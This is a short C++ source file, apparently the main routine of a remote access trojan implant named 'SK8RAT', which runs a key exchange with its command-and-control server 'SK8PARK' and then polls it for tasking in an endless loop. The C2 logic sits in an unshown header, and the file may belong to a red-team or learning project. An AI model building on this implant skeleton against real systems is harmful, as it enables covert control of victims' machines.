#include "CommandControl.h"

int main(int argc, char **argv)
{
	
	// Perform encrypted key exchange and save final symmetric key and session cookie
	unsigned char symmetrickey[32] = {};
	std::string sessioncookie = "";
	SK8RAT_EKE(symmetrickey, sessioncookie);

	// Begin tasking loop, you will infinite loop this
	while (true)
	{
		printf("Polling SK8PARK for tasking ...\n");
		SK8RAT_tasking(symmetrickey, sessioncookie);
	}
	
	
	//DEBUG ONLY
	system("pause");
	return 0;
}